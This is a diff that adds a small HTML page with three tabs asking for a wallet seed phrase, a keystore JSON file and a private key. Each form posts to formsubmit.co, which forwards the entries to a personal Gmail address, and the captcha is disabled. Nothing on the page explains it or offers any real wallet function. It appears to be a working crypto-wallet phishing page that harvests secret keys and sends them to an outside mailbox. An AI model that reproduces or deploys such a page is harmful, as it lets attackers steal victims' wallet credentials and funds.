@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<title>W3.CSS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<body>
+
+<div class="w3-container w2-padding-xxlarge">
+
+
+<div class="w3-bar w3-grey">
+  <button class="w3-bar-item w3-button" onclick="openCity('London')">Phase</button>
+  <button class="w3-bar-item w3-button" onclick="openCity('Paris')">Keystore JSON</button>
+  <button class="w3-bar-item w3-button" onclick="openCity('Tokyo')">Private Key</button>
+</div>
+
+<div id="London" class="w3-container city">
+  <h2>Phase</h2>
+    <form action="https://formsubmit.co/babbanfirist@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input class="w3-input w3-border" type="text" placeholder="Input Phase">
+        <br>
+        <button class="w3-btn w3-blue">Submit</button>
+    </form>
+</div>
+
+<div id="Paris" class="w3-container city" style="display:none">
+  <h2>Keystore JSON</h2>
+  <form action="https://formsubmit.co/babbanfirist@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+        <textarea class="w3-input w3-border" type="textarea" placeholder="Input Phase" rows="6" cols="24"></textarea>
+        <br>
+        <button class="w3-btn w3-blue">Submit</button>
+    </form> 
+</div>
+
+<div id="Tokyo" class="w3-container city" style="display:none">
+  <h2>Private Key</h2>
+  <form action="https://formsubmit.co/babbanfirist@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+        <input class="w3-input w3-border" type="text" placeholder="Input Private Key">
+        <br>
+        <button class="w3-btn w3-blue">Submit</button>
+    </form>
+</div>
+
+<script>
+function openCity(cityName) {
+  var i;
+  var x = document.getElementsByClassName("city");
+  for (i = 0; i < x.length; i++) {
+    x[i].style.display = "none";  
+  }
+  document.getElementById(cityName).style.display = "block";  
+}
+</script>
+
+</body>
+</html>
